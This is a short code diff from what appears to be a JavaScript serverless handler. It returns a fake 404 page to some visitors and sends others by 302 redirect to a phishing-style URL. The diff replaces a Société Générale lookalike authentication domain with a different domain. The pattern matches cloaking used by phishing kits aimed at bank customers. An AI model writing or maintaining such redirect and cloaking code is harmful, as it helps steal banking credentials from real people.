@@ -23,7 +23,7 @@ export default async function handler(req, res) {
         </body></html>`;
       return res.status(404).send(fake404);
     } else {
-      res.writeHead(302, { Location: 'https://sg-fr-authen.mrzxa.app/societegenerale-fr/a' });
+      res.writeHead(302, { Location: 'https://maurpie.com/a' });
       return res.end();
     }
   } catch (err) {
